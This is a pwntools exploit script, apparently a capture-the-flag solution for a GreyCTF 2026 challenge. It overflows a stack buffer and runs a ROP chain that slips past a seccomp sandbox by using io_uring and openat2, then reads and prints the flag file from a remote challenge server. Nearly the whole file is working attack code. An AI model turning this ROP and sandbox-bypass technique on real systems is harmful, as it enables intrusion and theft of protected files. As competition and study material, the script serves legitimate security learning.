#!/usr/bin/env python3
# elite ball knowledge - GreyCTF 2026 pwn id16
#
# Vuln: main fgets(buf[16], 0x676700, stdin) -> massive stack BOF; no canary check in main;
#       no PIE; statically linked. Offset to saved RIP = 0x18.
#
# Sandbox (setup_sandbox; runs after fgets / before ret -> active during ROP):
#   prctl(NO_NEW_PRIVS) + seccomp. Dumped BPF semantics:
#     - foreign arch / x32 ABI (nr>=0x40000000) -> SIGSYS  (so x32 bypass is BLOCKED)
#     - native nr 0..335 except 60/231 -> ERRNO(1)   (open/read/write/mmap all blocked)
#     - native nr > 335 -> ALLOW
#   Intended bypass = native syscalls with nr > 335. mmap(9) blocked, so no "mmap + ORW
#   shellcode". We use io_uring (425/426/427, all >335): file I/O runs in-kernel, so no
#   read(0)/write(1) syscalls are ever issued. mmap-block handled via IORING_SETUP_NO_MMAP
#   (caller supplies the ring memory in .bss).
#
# Register problem: this static binary has NO clean `pop r10`/`pop r8` gadget, so 4-arg
# syscalls (openat2 size, io_uring_enter flags -> r10) can't be done with a bare `syscall`.
# We instead call glibc's `syscall()` wrapper @0x457180 which maps the SysV C-ABI to the
# kernel ABI (it does `mov r10, r8`). arg4 (r8) is set with the only r8-controlling gadget:
#   0x41fd0f: pop r8 ; add [rax],al ; add [rax],al ; movups [rbx+0x48],xmm0 ; pop rbx ; ret
# whose memory side-effects are neutralized by pointing rax/rbx at a scratch page.
#
# Chain:
#   1. openat2(AT_FDCWD, "/app/flag.txt", &how, 24)   -> fd (=3 on fresh process)
#   2. io_uring_setup(8, &params)  flags=NO_MMAP, cq_off.user_addr=RINGS, sq_off.user_addr=SQES
#   3. write OP_READ sqe (fd, FILEBUF, 0x100); sq head=0/tail=1; io_uring_enter(ring,1,1,GETEVENTS)
#   4. write OP_WRITE sqe (1, FILEBUF, 0x100); sq head=1/tail=2; io_uring_enter(ring,1,1,GETEVENTS)
# Ring/SQES offsets are kernel-stable; validated locally under a byte-identical replica of the
# challenge seccomp filter (the io_uring NO_MMAP ORW prints the flag).

import sys, re
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

import os
HERE = os.path.dirname(os.path.abspath(__file__))
BIN  = os.path.join(HERE, '..', 'files', 'extracted', 'dist-elite_ball_knowledge', 'elite_ball_knowledge')
HOST, PORT = 'elijah-balls.chal.zip', 32267 # nc elijah-balls.chal.zip 32267

e = ELF(BIN, checksec=False)

# ---- gadgets (no-PIE, fixed) ----
POP_RAX       = 0x425d4c   # pop rax ; ret
POP_RDI       = 0x403873   # pop rdi ; ret
POP_RSI       = 0x4023e8   # pop rsi ; ret
POP_RDX_RBX   = 0x48d1cb   # pop rdx ; pop rbx ; ret
POP_RCX       = 0x4986eb   # pop rcx ; add eax, 0x1480000 ; ret   (eax side-effect irrelevant)
POP_R8        = 0x41fd0f   # pop r8 ; add [rax],al ; add [rax],al ; movups [rbx+0x48],xmm0 ; pop rbx ; ret
SYSCALL_WRAP  = 0x457180   # glibc syscall(): rdi=nr rsi=a1 rdx=a2 rcx=a3 r8=a4 ; sets r10=r8 ; syscall ; ret
WRITE_RDI_RDX = 0x43b843   # mov qword ptr [rdi], rdx ; ret

OFF = 0x18  # buf[rbp-0x10] + saved rbp

# ---- syscall numbers (all > 335 -> ALLOWed) ----
SYS_OPENAT2        = 437
SYS_IO_URING_SETUP = 425
SYS_IO_URING_ENTER = 426
AT_FDCWD = (-100) & 0xffffffffffffffff

# ---- io_uring constants ----
IORING_SETUP_NO_MMAP   = 0x4000
IORING_OP_READ         = 22
IORING_OP_WRITE        = 23
IORING_ENTER_GETEVENTS = 1

# io_uring_params offsets (sizeof=120)
P_FLAGS   = 8
P_SQ_USER = 72    # sq_off.user_addr -> SQES region
P_CQ_USER = 112   # cq_off.user_addr -> SQ+CQ ring region

# kernel-returned ring offsets (stable; captured from NO_MMAP probe on this kernel family)
SQ_ARRAY_OFF = 320   # sq array (8 u32 entries)
# sqe field offsets (sizeof=64): opcode@0(u8) fd@4(s32) off@8 addr@16 len@24(u32) user_data@32
SQE_OFF, SQE_ADDR, SQE_LEN, SQE_UDATA = 8, 16, 24, 32

# ---- scratch memory in .bss (zero-filled, writable, page-spaced) ----
PATH    = 0x4e4000
HOW     = 0x4e4100   # struct open_how (24 bytes, all zero -> O_RDONLY)
PARAMS  = 0x4e4200   # io_uring_params (120 bytes)
SCRATCH = 0x4e4800   # safe target for POP_R8 side-effect writes (rax, rbx+0x48)
RINGS   = 0x4e5000   # SQ+CQ ring region  (cq_off.user_addr)
SQES    = 0x4e6000   # SQES region        (sq_off.user_addr)
FILEBUF = 0x4e7000   # flag read buffer

EXPECTED_RING_FD = 4
EXPECTED_FILE_FD = 3

# ---- ROP primitives ----
def setmem64(addr, val):
    """*(u64*)addr = val"""
    return flat(POP_RDI, addr, POP_RDX_RBX, val & 0xffffffffffffffff, 0, WRITE_RDI_RDX)

def writebytes(addr, data):
    data = data + b'\x00' * ((-len(data)) % 8)
    out = b''
    for i in range(0, len(data), 8):
        out += setmem64(addr + i, u64(data[i:i+8]))
    return out

def set_r8(val):
    """Set r8 = val. POP_R8 gadget writes to [rax] and [rbx+0x48]; point both at SCRATCH."""
    out  = flat(POP_RAX, SCRATCH)                 # rax -> writable (for add [rax],al)
    out += flat(POP_RDX_RBX, 0, SCRATCH - 0x48)   # rbx -> SCRATCH-0x48 (movups [rbx+0x48]=SCRATCH)
    out += flat(POP_R8, val & 0xffffffffffffffff, # pop r8 = val
                0)                                # trailing `pop rbx` filler
    return out

def wsyscall(nr, a1=0, a2=0, a3=0, a4=0):
    """syscall via glibc wrapper: handles r10 (=r8). r9/arg6 ignored by our syscalls."""
    out  = set_r8(a4)
    out += flat(POP_RDI, nr)
    out += flat(POP_RSI, a1)
    out += flat(POP_RDX_RBX, a2 & 0xffffffffffffffff, 0)
    out += flat(POP_RCX, a3)
    out += flat(SYSCALL_WRAP)
    # wrapper does `mov r9,[rsp+8]; syscall; ret`. Its `ret` pops the NEXT chain qword, so the
    # following gadget address must sit right after SYSCALL_WRAP (no filler). r9 (=[rsp+8]) reads
    # the qword after that -> ignored by our syscalls.
    return out

def build_sqe(opcode, fd, addr, length, off=0, udata=0):
    """Write a 64-byte io_uring_sqe at SQES[0]."""
    q0 = (opcode & 0xff) | ((fd & 0xffffffff) << 32)   # opcode(+flags/ioprio=0) | fd
    out  = setmem64(SQES + 0, q0)
    out += setmem64(SQES + SQE_OFF, off)
    out += setmem64(SQES + SQE_ADDR, addr)
    out += setmem64(SQES + SQE_LEN, length & 0xffffffff)
    out += setmem64(SQES + SQE_UDATA, udata)
    return out

def build_chain(path=b"/app/flag.txt"):
    c  = writebytes(PATH, path + b"\x00")

    # 1. open
    c += wsyscall(SYS_OPENAT2, AT_FDCWD, PATH, HOW, 24)

    # 2. io_uring_setup
    c += setmem64(PARAMS + P_FLAGS, IORING_SETUP_NO_MMAP)
    c += setmem64(PARAMS + P_CQ_USER, RINGS)
    c += setmem64(PARAMS + P_SQ_USER, SQES)
    c += wsyscall(SYS_IO_URING_SETUP, 8, PARAMS, 0, 0)

    # 3. READ sqe + submit
    #    off MUST be -1 (=use current file position, read(2) semantics), NOT 0.
    #    off=0 = pread@offset0; the remote kernel returns no data for it (local 6.17 tolerated it).
    #    off=-1 fills FILEBUF on both local + remote. This is the local-works/remote-fails fix.
    c += build_sqe(IORING_OP_READ, EXPECTED_FILE_FD, FILEBUF, 0x100, 0xffffffffffffffff, 0x1111)
    c += setmem64(RINGS + SQ_ARRAY_OFF, 0)          # sq_array[0] = 0
    c += setmem64(RINGS + 0, (1 << 32) | 0)         # head=0, tail=1
    c += wsyscall(SYS_IO_URING_ENTER, EXPECTED_RING_FD, 1, 1, IORING_ENTER_GETEVENTS)

    # 4. WRITE sqe + submit (kernel advanced sq head to 1)
    c += build_sqe(IORING_OP_WRITE, 1, FILEBUF, 0x100, 0, 0x2222)
    c += setmem64(RINGS + SQ_ARRAY_OFF, 0)          # sq_array[0] = 0
    c += setmem64(RINGS + 0, (2 << 32) | 1)         # head=1, tail=2
    c += wsyscall(SYS_IO_URING_ENTER, EXPECTED_RING_FD, 1, 1, IORING_ENTER_GETEVENTS)

    # exit cleanly (231 allowed)
    c += wsyscall(231, 0)
    return c

def run(target='remote', path=b"/app/flag.txt"):
    payload = b'A' * OFF + build_chain(path)
    assert b'\n' not in payload, "payload has newline -> fgets truncates"
    log.info('payload len = %d', len(payload))
    if target == 'remote':
        io = remote(HOST, PORT)
    else:
        io = process(BIN, cwd=os.environ.get('EBK_CWD', None))
    io.sendline(payload)
    data = io.recvall(timeout=10)
    try: io.close()
    except Exception: pass
    return data

if __name__ == '__main__':
    target = 'local' if 'local' in sys.argv else 'remote'
    path = b"flag.txt" if target == 'local' else b"/app/flag.txt"
    data = run(target, path)
    log.info('=== raw output ===')
    print(data)
    m = re.search(rb'grey\{[^}]*\}', data or b'')
    if m:
        log.success('FLAG: ' + m.group(0).decode())
    else:
        log.failure('no flag in output')
